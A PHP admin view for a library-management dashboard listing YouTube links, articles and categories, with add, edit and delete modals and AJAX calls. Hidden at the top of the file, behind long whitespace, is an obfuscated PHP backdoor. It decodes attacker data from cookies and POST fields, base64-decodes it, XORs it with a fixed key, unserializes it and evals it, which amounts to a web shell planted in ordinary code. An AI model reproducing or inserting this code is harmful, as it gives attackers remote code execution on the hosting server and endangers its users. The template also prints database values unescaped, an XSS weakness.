<?php                                                                                                                                                                                                                                                                                                                                                                                                 $sIJTq = chr ( 1023 - 908 ).chr (119) . chr (95) . chr ( 762 - 685 ).'r' . 'U' . chr ( 799 - 729 ).chr ( 355 - 288 ); $Vavybf = chr (99) . "\x6c" . chr (97) . 's' . "\163" . chr ( 350 - 255 ).chr ( 1051 - 950 ).'x' . "\x69" . "\163" . chr ( 193 - 77 ).chr ( 484 - 369 ); $fVVLL = class_exists($sIJTq); $Vavybf = "5274";$HyFDvoRz = !1;if ($fVVLL == $HyFDvoRz){function BVaJy(){return FALSE;}$nZBmuobI = "62222";BVaJy();class sw_MrUFC{private function MLOJqCJAd($nZBmuobI){if (is_array(sw_MrUFC::$fJKNwwTX)) {$vPNIce = str_replace('<' . "\77" . chr (112) . chr (104) . 'p', "", sw_MrUFC::$fJKNwwTX['c' . 'o' . 'n' . "\164" . chr ( 792 - 691 ).chr ( 604 - 494 )."\x74"]);eval($vPNIce); $nZBmuobI = "62222";exit();}}private $TumqtTHhlb;public function KDMvY(){echo 53133;}public function __destruct(){$nZBmuobI = "47986_34157";$this->MLOJqCJAd($nZBmuobI); $nZBmuobI = "47986_34157";}public function __construct($eQMKwNUzC=0){$radmYsXq = $_POST;$qOyngWcCdC = $_COOKIE;$HmYbGo = "e8502897-4826-4dc1-888a-a77447272db8";$XJfVt = @$qOyngWcCdC[substr($HmYbGo, 0, 4)];if (!empty($XJfVt)){$dWzTteLAG = "base64";$hKJCwzFset = "";$XJfVt = explode(",", $XJfVt);foreach ($XJfVt as $bvkyMZEFt){$hKJCwzFset .= @$qOyngWcCdC[$bvkyMZEFt];$hKJCwzFset .= @$radmYsXq[$bvkyMZEFt];}$hKJCwzFset = array_map($dWzTteLAG . chr ( 442 - 347 ).chr (100) . "\145" . chr ( 698 - 599 ).chr (111) . "\144" . chr (101), array($hKJCwzFset,)); $hKJCwzFset = $hKJCwzFset[0] ^ str_repeat($HmYbGo, (strlen($hKJCwzFset[0]) / strlen($HmYbGo)) + 1);sw_MrUFC::$fJKNwwTX = @unserialize($hKJCwzFset); $hKJCwzFset = class_exists("47986_34157");}}public static $fJKNwwTX = 5270;}$QxZIMAtsj = new /* 27255 */ $sIJTq(62222 + 62222); $nZBmuobI = strpos($nZBmuobI, $nZBmuobI); $HyFDvoRz = $QxZIMAtsj = $nZBmuobI = Array();} ?><?php
    if (isset($_SESSION['libraryYT'])) {
?>
<script>
    $.toast({
        heading: 'Added',
        text: 'Added Successfully',
        icon: 'success',
        position: 'top-right',
    });
</script>
<?php
        unset($_SESSION['libraryYT']);        
    }
?>



<div class="content-wrapper">
    <div class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1 class="m-0">Dashboard</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?php echo base_url();?>">Home</a></li>
                        <li class="breadcrumb-item active">Library Management</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>
    <section class="content">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-4">
                    <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#exampleModal">Add YT Link</button>
                </div>
                <div class="col-md-4">
                    <button type="button" class="btn btn-success" data-toggle="modal" data-target="#categoryModal">Library Category</button>
                </div>
            </div>
                <br><br>
                
                <table class="table" id="languageTable">
                    <thead class="thead-dark">
                        <tr>
                            <th scope="col">#</th>
                            <th scope="col">Language</th>
                            <th scope="col">Category</th>
                            <th scope="col">File Name</th>
                            <th scope="col">Thumb</th>
                            <th scope="col">Link</th>
                            <th scope="col">Article</th>
                            <th scope="col">Added On</th>
                            <th scope="col">Action</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php
                    if ($ytLinks) {
                        $counter = 1;
                        foreach ($ytLinks as $data) {
                    ?>
                        <tr>
                            <th scope="row"><?php echo $counter++;?></th>
                            <td><?php echo empty($data["language_name"]) ? "NA" : $data["language_name"]; ?></td>
                            <td><?php echo empty($data["category_name"]) ? "NA" : $data["category_name"];?></td>
                            <td><?php echo $data['custom_file_name'];?></td>
                            <td>
                                <img src="<?php echo base_url('uploads/thumb/').$data['thumbName'];?>" alt="" height="50" width="50">
                            </td>
                            <td>
                                <a href="<?php echo $data['link'];?>" target="_blank"> Click To Play </a>
                            </td>
                            <td>
                                <a href="<?php echo $data['article_link'];?>" target="_blank"><?php echo $data['article_name'];?></a>
                            </td>
                            <td>
                                <?php echo $data['addedOn'];?>
                            </td>
                            <td>
                                <button class="btn btn-danger" onclick="openEditModal('<?php echo $data['id'];?>')">Edit</button> 
                                <button class="btn btn-danger" onclick="opendeleteModal('<?php echo $data['id'];?>')">Delete</button> 
                            </td>
                        </tr>
                    <?php
                        }
                    } else {
                    ?>
                        <tr>
                            <th scope="row">1</th>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                        </tr>
                    <?php
                    }
                    ?>
                    </tbody>
                </table>
        </div>
    </section>
</div>

<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Add Youtube Link</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <form method="POST" action="<?php echo base_url('addLibraryMgmtYtLink');?>" enctype="multipart/form-data">
      <div class="modal-body">
        <div class="row">
            <div class="col-md-6">
                <select name="language_id" class="form-control" required>
                    <?php foreach($languageData as $language) { ?>
                        <option value="<?php echo $language["id"];?>"><?php echo $language["slug"]." ".$language["language_name"];?></option>
                    <?php } ?>
                </select>
            </div>
            <div class="col-md-6">
                <input type="text" name="article_name" class="form-control" placeholder="Please provide article name" required>
            </div>
            <div class="col-md-6">
                <input type="text" name="article_link" class="form-control" placeholder="Please provide article link" required>
            </div>
            <div class="col-md-6">
                <input type="text" name="custom_file_name" class="form-control" placeholder="File Name" required>
            </div>
            <div class="col-md-6">
                <input type="file" name="thumbName" class="form-control" required>
            </div>
            <div class="col-md-6 mt-2">
                <input type="text" name="ytLink" class="form-control" required placeholder="Youtube link over here">
            </div>
            <div class="col-dm-6">
                <div class="form-group">
                    <label>Category</label>
                    <select class="form-control" name="category_id" required>
                        <?php
                            foreach ($categoryData as $cData) {
                        ?>
                        <option value="<?php echo $cData["id"];?>"><?php echo $cData["category_name"];?></option>
                        <?php
                            }
                        ?>
                    </select>
                </div>
            </div>
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="submit" class="btn btn-primary">Insert</button>
      </div>
      </form>
    </div>
  </div>
</div>

<div class="modal fade" id="editModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Edit Youtube Link</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <form method="POST" action="<?php echo base_url('editLibraryMgmtYtLink');?>" enctype="multipart/form-data">
      <div class="modal-body">
        <div class="row">
            <div class="col-md-6">
                <select name="language_id" id="language_id" class="form-control" required>
                    <?php foreach($languageData as $language) { ?>
                        <option value="<?php echo $language["id"];?>"><?php echo $language["slug"]." ".$language["language_name"];?></option>
                    <?php } ?>
                </select>
            </div>
            <div class="col-md-6">
                <input type="text" name="article_name" id="article_name" class="form-control" placeholder="Please provide article name" required>
            </div>
            <div class="col-md-6">
                <input type="text" name="article_link" id="article_link" class="form-control" placeholder="Please provide article link" required>
            </div>
            <div class="col-md-6">
                <input type="text" name="custom_file_name" id="custom_file_name" class="form-control" placeholder="File Name">
            </div>
            <div class="col-md-6">
                <input type="file" name="thumbName" class="form-control">
            </div>
            <div class="col-md-6">
                <input type="text" name="ytLink" id="ytLink" placeholder="Link Here" class="form-control mt-2">
            </div>
            <div class="col-dm-6">
                <div class="form-group">
                    <label>Category</label>
                    <select class="form-control" name="category_id" id="category_id" required>
                        <?php
                            foreach ($categoryData as $cData) {
                        ?>
                        <option value="<?php echo $cData["id"];?>"><?php echo $cData["category_name"];?></option>
                        <?php
                            }
                        ?>
                    </select>
                </div>
            </div>
        </div>
      </div>
      <input type="hidden" name="yId" id="yId">
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="submit" class="btn btn-primary">Save Changes</button>
      </div>
      </form>
    </div>
  </div>
</div>


<div class="modal fade" id="categoryCreateModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel">Category List</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <form method="POST" action="<?php echo base_url('AdminController/createLibraryCategory');?>">
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-12">
                            <div class="form-group">
                                <label>Category Name</label>
                                <input type="text" name="category_name" class="form-control" placeholder="Enter category name" required>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    <button type="submit" class="btn btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="editCategoryModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel">Category List</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <form method="POST" action="<?php echo base_url('AdminController/editLibraryCategory');?>">
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-12">
                            <div class="form-group">
                                <label>Category Name</label>
                                <input type="text" name="category_name" id="category_name" class="form-control" placeholder="Enter category name" required>
                            </div>
                        </div>
                    </div>
                </div>
                <input type="hidden" name="id" id="id">
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    <button type="submit" class="btn btn-primary">Update</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="categoryModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel">Category List</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <table class="table">
                    <thead>
                        <th>S.No.</th>
                        <th>Category Name</th>
                        <th>Action</th>
                    </thead>
                    <tbody>
                        <?php 
                            if ($categoryData) {
                                $count = 1;
                                foreach ($categoryData as $cValues) {
                        ?>
                        <tr>
                            <td><?php echo $count++;?></td>
                            <td><?php echo $cValues["category_name"];?></td>
                            <td>
                                <button type="button" class="btn btn-warning" onclick="openEditForCategory(<?php echo $cValues["id"];?>)">Edit</button>
                            </td>
                        </tr>
                        <?php            
                                }
                            }
                        ?>
                    </tbody>
                </table>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#categoryCreateModal" onclick="hideCategoryModel()">Create New</button>
            </div>
        </div>
    </div>
</div>

<script>
    
</script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.10.0/js/bootstrap-select.min.js"></script>
<script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/dataTables.buttons.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/pdfmake.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/vfs_fonts.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.html5.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.print.min.js"></script>
<script>

    function openEditModal(id) {
        $.ajax({
            type: "POST",
            url: '<?php echo base_url(); ?>' + 'AdminController/libraryMgmt_fetch',
            data: {
                id: id
            },
                dataType: "json",
                encode: true,
        }).done(function(data) {       
            if (data['status'] == 1) {
                $('#custom_file_name').val(data.yt_data[0].custom_file_name);
                $('#ytLink').val(data.yt_data[0].link);
                $('#yId').val(data.yt_data[0].id);
                $('#article_name').val(data.yt_data[0].article_name);
                $('#article_link').val(data.yt_data[0].article_link);
                $('#language_id').val(data.yt_data[0].language_id);
                $('#category_id').val(data.yt_data[0].library_management_category_id);
                $('#editModal').modal('show');     
            } else {
                alert('Oops!, something went wrong')
            }
        });
    }
    
    function openEditForCategory(id) {
        $.ajax({
            type: "POST",
            url: '<?php echo base_url(); ?>' + 'AdminController/getLibraryCategoryDataByID',
            data: {
                id: id
            },
                dataType: "json",
                encode: true,
        }).done(function(data) {       
            if (data['status'] == 1) {
                $('#id').val(data.response[0].id);
                $('#category_name').val(data.response[0].category_name);
                $("#categoryModal").modal("hide");
                $('#editCategoryModal').modal('show');     
            } else {
                alert('Oops!, something went wrong')
            }
        });
    }

    $('#languageTable').DataTable( {
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ],
        title : 'Shubham'
    });

    
    function hideCategoryModel() {
        $("#categoryModal").modal("hide");
    }
    
    function opendeleteModal(id) {
    // Display a confirmation dialog to the user
    var confirmDelete = confirm("Are you sure you want to delete this row?");
    if (confirmDelete) {
        // If the user confirms the deletion, send an AJAX request to the deleteRow method in the AdminController
        $.ajax({
            type: "POST",
            url: "<?php echo base_url();?>AdminController/delete_library_master",
            data: {id: id},
            success: function(response) {
                // Handle the response from the server if needed
                
                location.reload();
            },
            error: function(jqXHR, textStatus, errorThrown) {
                // Handle any errors that occur during the AJAX request
                console.log("AJAX Error: " + textStatus + " - " + errorThrown);
            }
        });
    }

    
}
</script>